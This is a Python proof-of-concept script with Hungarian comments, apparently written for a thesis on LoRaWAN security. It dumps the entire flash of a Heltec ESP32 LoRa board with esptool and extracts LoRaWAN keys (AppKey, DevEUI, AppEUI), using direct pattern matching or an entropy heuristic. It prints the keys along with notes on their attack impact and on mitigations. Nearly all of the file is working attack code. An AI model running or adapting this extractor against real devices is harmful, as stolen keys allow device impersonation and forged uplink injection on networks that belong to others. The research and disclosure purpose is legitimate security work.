#!/usr/bin/env python3
"""
PoC #1 — LoRaWAN Flash Dump & Key Extraction v2
Diplomamunka: LoRaWAN Class A biztonsági elemzés

Futtatás:
    python3 poc1_flash_dump.py --port /dev/ttyUSB0
    python3 poc1_flash_dump.py --skip-dump  (meglévő dump.bin esetén)
"""

import argparse, subprocess, sys, time, os

BANNER = """
╔══════════════════════════════════════════════════════════╗
║   PoC #1 — LoRaWAN Flash Dump & Key Extraction  v2      ║
║   Target: Heltec WiFi LoRa 32 V2 (ESP32-D0WDQ6)        ║
║   Attack: Physical access → AppKey compromise            ║
╚══════════════════════════════════════════════════════════╝
"""

def step(n, text):
    print(f"\n[{n}] {text}\n" + "─" * 55)

def ok(t):   print(f"    [OK] {t}")
def fail(t): print(f"    [!!] {t}")
def info(t): print(f"    [..] {t}")


def dump_flash(port, output, baud=921600):
    step(1, f"Flash dump: {port} → {output}")
    info(f"Baud: {baud}  |  Méret: 8MB  |  Várható idő: ~2 perc")
    t = time.time()
    r = subprocess.run(
        ["esptool", "--port", port, "--baud", str(baud),
         "read-flash", "0x0", "0x800000", output],
        capture_output=True, text=True
    )
    if r.returncode != 0:
        fail("esptool hiba:"); print(r.stderr); return False
    elapsed = time.time() - t
    ok(f"Dump kész: {os.path.getsize(output):,} byte ({elapsed:.1f}s)")
    for line in r.stdout.splitlines():
        if any(k in line for k in ["Chip type", "MAC", "Flash size"]):
            info(line.strip())
    return True


def search_keys(dump_path, known_keys=None):
    step(2, "LoRaWAN kulcsok keresése")
    data = open(dump_path, "rb").read()
    info(f"Dump méret: {len(data):,} byte")

    results = {}

    # ── Ha ismerjük a kulcsokat: direkt keresés ──────────────────────────────
    if known_keys:
        info("Direkt pattern keresés (ismert kulcsok)...")
        for name, hexval in known_keys.items():
            key = bytes.fromhex(hexval)
            pos = data.find(key)
            if pos != -1:
                results[name] = (pos, key, "big-endian")
                continue
            rev = bytes(reversed(key))
            pos = data.find(rev)
            if pos != -1:
                results[name] = (pos, rev, "little-endian")
                continue
            fail(f"{name} nem található")
        return data, results

    # ── Ha nem ismerjük: entrópia alapú keresés 16 byte-os lépésekkel ────────
    info("Entrópia alapú keresés (ismeretlen kulcsok)...")
    info("Firmware terület: 0x10000 – 0x200000, lépés: 16 byte")

    candidates = []
    fw_start, fw_end = 0x10000, 0x200000
    i = fw_start
    while i < min(fw_end, len(data) - 16):
        block = data[i:i+16]
        if block.count(0x00) <= 3 and block.count(0xFF) <= 3 and len(set(block)) >= 8:
            candidates.append((i, block))
        i += 16   # 16 byte-os lépés — 16x gyorsabb mint az előző verzió

    info(f"Jelölt blokkok: {len(candidates)} db")

    # Egymáshoz közeli jelöltek = kulcscsoport
    for idx in range(len(candidates) - 1):
        pos1, b1 = candidates[idx]
        pos2, b2 = candidates[idx+1]
        if pos2 - pos1 <= 32:
            appkey_pos  = pos1
            appkey_data = data[appkey_pos:appkey_pos+16]
            deveui_pos  = appkey_pos + 16
            deveui_data = data[deveui_pos:deveui_pos+8]
            appeui_pos  = deveui_pos + 8
            appeui_data = data[appeui_pos:appeui_pos+8]
            results["APPKEY"] = (appkey_pos, appkey_data, "big-endian")
            results["DEVEUI"] = (deveui_pos, deveui_data, "little-endian")
            results["APPEUI"] = (appeui_pos, appeui_data, "little-endian")
            ok(f"Kulcscsoport megtalálva: 0x{appkey_pos:06x}")
            break

    return data, results


def raw_dump(data, base, size=64):
    step(3, f"Raw dump a kulcsterületről (0x{base:06x})")
    for i in range(0, size, 16):
        row = data[base+i:base+i+16]
        if not row: break
        h = ' '.join(f'{b:02x}' for b in row)
        a = ''.join(chr(b) if 32 <= b < 127 else '.' for b in row)
        print(f"    {base+i:06x}  {h:<48}  {a}")


def summary(results, dump_path):
    step(4, "Eredmény összefoglalás")
    if not results:
        fail("Nem sikerült kulcsokat kinyerni.")
        info("Lehetséges ok: Flash Encryption aktív, vagy placeholder (0x00) kulcsok")
        return

    print()
    print("    ┌─────────────────────────────────────────────────────────────┐")
    print("    │              KINYERT LoRaWAN KULCSOK                        │")
    print("    ├──────────┬──────────┬──────────────────────────────────────┤")
    print("    │  Kulcs   │  Cím     │  Érték                               │")
    print("    ├──────────┼──────────┼──────────────────────────────────────┤")
    for name, (pos, key_bytes, endian) in results.items():
        print(f"    │  {name:<8}│  0x{pos:06x}│  {key_bytes.hex():<38}│")
    print("    └──────────┴──────────┴──────────────────────────────────────┘")
    print()
    print("    Impakt:")
    print("      - AppKey ismert → NwkSKey + AppSKey levezetése lehetséges")
    print("      - Session key → hamis uplink injektálás (B lánc PoC #3)")
    print("      - DevEUI + AppKey → teljes eszköz megszemélyesítés")
    print()
    print("    Mitigáció:")
    print("      - ESP32 Flash Encryption (eFuse) bekapcsolása")
    print("      - ESP32 Secure Boot engedélyezése")
    print("      - Kulcsok NVS encrypted storage-ban tárolása")
    print()
    print(f"    Eszköz:  Heltec WiFi LoRa 32 V2 (ESP32-D0WDQ6)")
    print(f"    Védelem: Secure Boot=OFF, Flash Encryption=OFF")
    print(f"    Dump:    {dump_path} ({os.path.getsize(dump_path):,} byte)")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("--port",      default="/dev/ttyUSB0")
    parser.add_argument("--baud",      type=int, default=921600)
    parser.add_argument("--output",    default="flash_dump.bin")
    parser.add_argument("--skip-dump", action="store_true")
    parser.add_argument("--appeui",    help="Ismert APPEUI hex (opcionális)")
    parser.add_argument("--deveui",    help="Ismert DEVEUI hex (opcionális)")
    parser.add_argument("--appkey",    help="Ismert APPKEY hex (opcionális)")
    args = parser.parse_args()

    if not args.skip_dump:
        if not dump_flash(args.port, args.output, args.baud):
            sys.exit(1)
    else:
        if not os.path.exists(args.output):
            fail(f"Nem létezik: {args.output}"); sys.exit(1)
        info(f"Meglévő dump: {args.output}")

    known = {}
    if args.appkey: known["APPKEY"] = args.appkey
    if args.deveui: known["DEVEUI"] = args.deveui
    if args.appeui: known["APPEUI"] = args.appeui

    data, results = search_keys(args.output, known or None)

    if results:
        base = min(pos for pos, _, _ in results.values())
        raw_dump(data, max(0, base - 16))

    summary(results, args.output)


if __name__ == "__main__":
    main()